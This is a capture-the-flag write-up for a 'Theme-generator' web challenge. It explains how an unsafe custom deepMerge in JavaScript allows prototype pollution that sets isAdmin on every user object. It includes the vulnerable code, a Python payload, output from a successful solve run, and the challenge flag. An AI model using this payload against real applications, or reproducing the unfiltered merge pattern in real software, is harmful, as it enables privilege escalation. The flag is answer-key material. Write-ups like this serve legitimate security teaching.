# Theme-generator

![Proof](proof.png)

**Author:** `thek0der`  
**Solves:** 56

---

## Description

Just a simple theme generator app. Nothing fancy.

We get: `handout.zip`
---

## Vulnerability

1. Unsafe custom deep-merge → Prototype Pollution
The application merges uploaded JSON into an internal configuration using a home-grown `deepMerge` implementation similar to:
```js
function deepMerge(target, source) {
  for (const k in source) {
    const val = source[k];
    if (val && typeof val === 'object' && !Array.isArray(val)) {
      if (!target[k]) target[k] = {};
      deepMerge(target[k], val);
    } else {
      target[k] = val;
    }
  }
  return target;
}
```
**The problem**:
It iterates `for (const k in source)` and does not filter or validate property names.
When `k` resolves to special properties like `constructor` or `__proto__`, `target[k]` can refer to inherited JS built-ins. Recursing into them allows writing onto `Object.prototype`.
Example dangerous input (conceptually):
```json
{ "constructor": { "prototype": { "isAdmin": true } } }
```
After merge, `Object.prototype.isAdmin === true`.

2. Authorization logic is bypassable via polluted prototype
The app proves vulnerable because admin-check logic uses a simple property check:
```js
if (req.user.isAdmin === true) { /* allow admin */ }
```
If `Object.prototype.isAdmin` is set to `true`, then `req.user.isAdmin` will resolve via the prototype chain to `true` for any `req.user`, elevating privileges for any logged-in user (including `guest`).

## Solve:

We can try a payload like this one:
```python
payload = {
        "a": { "b": { "c": {
            "constructor": { "prototype": { "isAdmin": True } }
        } } }
    }
```

And when we run the `solve.py`:
```bash
python .\solve.py
logged in
send
upload status: 200
{"ok":true,"merged":{"theme":{"name":"light","colors":{"bg":"#fff","fg":"#111","isAdmin":true},"isAdmin":true},"options":{"compact":false,"isAdmin":true},"isAdmin":true,"a":{"b":{"c":{"isAdmin":true},"isAdmin":true},"isAdmin":true}}}
flag: ctf{fa82311c2970593b2df929b7d0f1ca6292a9a2d3707057b84a5127ceed38edd6}
```

### Flag: ctf{fa82311c2970593b2df929b7d0f1ca6292a9a2d3707057b84a5127ceed38edd6}